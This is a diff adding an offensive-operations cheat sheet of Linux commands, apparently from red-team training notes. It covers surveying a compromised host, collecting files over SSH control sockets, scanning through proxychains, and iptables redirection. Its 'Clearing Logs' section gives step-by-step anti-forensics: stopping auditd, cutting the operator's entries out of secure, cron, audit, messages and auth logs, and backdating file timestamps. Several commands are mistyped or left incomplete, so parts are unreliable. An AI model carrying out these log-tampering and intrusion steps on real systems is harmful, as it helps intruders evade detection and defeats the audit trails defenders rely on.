@@ -1,0 +1,150 @@
+***VETTING***
+
+w 
+date; date -u
+uname -a
+
+ls -lart /
+ls -latr /tmp 
+ls -latr .
+ls -latr ..
+sudo ls -latr /root
+
+ps -elfH
+ifconfig -a; ip addr
+sudo netstat -auntp; ss -auntp
+
+sudo ls -latr /var/spool/cron
+tail -n 1000 <files in /var/spool/cron/>
+df
+
+ls -latr /var/*/*acc*
+ls -latr /var/*log*/
+sudo ls -latr /var/log/*
+ls -la /etc/*syslog*
+
+find / \(-path /proc -prine -o -path /sys -prune \) -o -mmin -<duration in minutes since initial connection> -type f -print0 | xargs -0 ls -latr
+
+sestatus; getenforce
+
+sudo cat /root/.bash_history
+sudo cat ~/.bash_history
+
+***Before Disconnect***
+
+w 
+ls -latr /tmp
+ps -elf
+netstat -lptn
+ls -latr /var/log
+find / \(-path /proc -prune -o -path /sys -prune \) -o -mmin -<your minutes on target> -type f -print0 | xargs -0 ls -latr
+
+
+***Privileged Users***
+w			who is logged in, how long, how
+netstat -auntp		any connections associated with their session
+ps -elf		networked proccess associated with session/PID
+last			access pattern of life
+cat /etc/sudoers	who can sudo
+cat /etc/group		what groups are what number
+groups <username>	what groups the user is apart of
+cat <user>/.bash_history
+cat <user>/.lesshst
+***Malware***		www.virustotal.com/gui/home/search
+lsof  			list open files
+lsmod			
+find / -mmin 
+(for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done)
+cat /proc
+insmod or modprobe
+
+***Logging***	Pport 514 for plaintext	Port 6514 for encrypted logs
+ls -latr /var/*/*acc*		tells us if Process Accounting is enablede				
+ls -latr /var/*log*/					
+sudo ls -latr /var/log/*
+sudo cat /var/log/* | grep student2
+ls -latr /etc/*syslog*	
+cat /etc/rsyslog.conf	if remote logging @@hostname check /etc/hosts
+lastlog		last successful login
+sudo lastb		btmp - bad login attemps MUST USE STRINGS TO VIEW
+last -10		provides a permant record of each time a user logged in and out
+/var/account/acct	process-level accounting
+/var/log/cron		information about cron jobs
+/var/log/kern		kernel error and warning data
+tail /var/log/[auth.log|secure] -n 100		shows ssh/login as well as banner grab
+sudo tail /var/log/messages				shows logs
+sudo tail /var/log/secure				shows connection and fails
+
+***Clearing Logs***
+		-secure-
+find /var/log -type f -mmin -<min> 2&> /dev/null		find logs created within minutes (min)
+grep -v ‘sshd\[1369\]’ /var/log/secure > /tmp/secure.clean
+grep ‘sshd\[1369\]’ /tmp/secure.clean
+cat /tmp/secure.clean > /var/log/secure
+touch -t <time of last log entry> /var/log/secure
+rm -rf /tmp/secure.clean
+		-cron-
+tail -30 /var/log/cron
+grep -v '<Time>' > /tmp/cron
+touch -t <time of last log entry> /var/log/cron
+rm -rf /tmp/cron
+		-audit.log-
+service auditd stop
+grep -n ‘<ip address,pic,time’ /var/log/audit/audit.log 
+wc -l /var/log/audit/audit.log
+head -n 38 /var/log/audit/audit.log > /tmp/aud.log (where X is the line number before your entries start)
+wc -l /tmp/aud.log (should be X lines)
+tail /tmp/aud.log
+date -d @epoch-time-of-last-entry 1476342061.290
+cat /tmp/aud.log > /var/log/audit/audit.log
+chmod 0600 /var/log/audit/audit.log (or whatever the preexisting privs were)
+touch -t time of last entry([CC]yymmddhhmm[.ss]) /var/log/audit/audit.log
+ls -al /var/log/audit/audit.log
+rm /tmp/aud.log
+service auditd start
+		-messages-
+tail /var/log/messages
+grep -n ‘<time>’ /var/log/messages
+head -n 1109 /var/log/messages > /tmp/mess.log
+cat /tmp/mess.log > /var/log/messages
+touch -t time of last entry([CC]yymmddhhmm[.ss]) /var/log/messages
+rm -rf /tmp/mess.log	
+		-auth.log-
+tail /var/log/auth.log
+grep -n ‘<time>’ /var/log/auth.log
+head -n 1109 /var/log/auth.log > /tmp/auth.log
+cat /tmp/auth.log > /var/log/auth.log
+touch -t time of last entry([CC]yymmddhhmm[.ss]) /var/log/auth.log
+rm -rf /tmp/auth.log
+***Collection***
+scp -P <port> <user>@<ip>:<wherefileiscomingfrom> <user>@<ip>:<wherefileisgoing>	
+scp -o ControlPath=/tmp/<T#> <user>@<ip>:<wherefileiscomingfrom> <user>@<ip>:<wherefileisgoing>	
+ssh -S /tmp/T# <user>@<Remote_IP > -p <ssh_Port> “cat <file>” > hist					Download
+ssh -S /tmp/T# <user>@<Remote_IP > -p <ssh_Port> “cat > <file>” < hist				Upload
+du -s
+***Scanning***
+ping 			TTL Value 64->*Nix 128-> Windows 255->Networking devices/solaris
+traceroute
+ssh -S /tmp/T1 dummy -O forward -D 9050
+proxychains nmap -sT -n -T3 -vvv -Pn <ip-range> -p 22
+nmap <ip/cidr> -p U:53,111,T:21-25		-p {port range} : scan specific port(s)  -sS : SYN Stealth Scan  -sT : TCP Connect Scan  -sU : UDP scan
+nc -z -v <hostname> 1-1023
+nc -zvn <IP> 22
+wget  --header="Accept: text/html" --user-agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0" --referrer connect.wso2.com http://google.com
+curl -A "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3" http://yahoo.com
+proxychains nmap <ip> -D 9050
+***IPTables***
+lsmod | grep ip		shows if IPTables is loaded or not
+iptables -t nat -L
+iptables -t nat -A PREROUTING -p <proto> --dport <port> -j DNAT --to-destination <ip:port> 
+iptables -t nat -A POSTROUTING -p <proto> –dport <port> -j SNAT –to-source <ip:port>
+iptables  -t nat -A POSTROUTING -p <proto> -dport <port> -j 
+iptables -t nat -A POSTROUTING -p tcp –dport 22 -j MASQUERADE
+sysctl net.ipv4.ip_forward
+
+
+
+
+
+
+
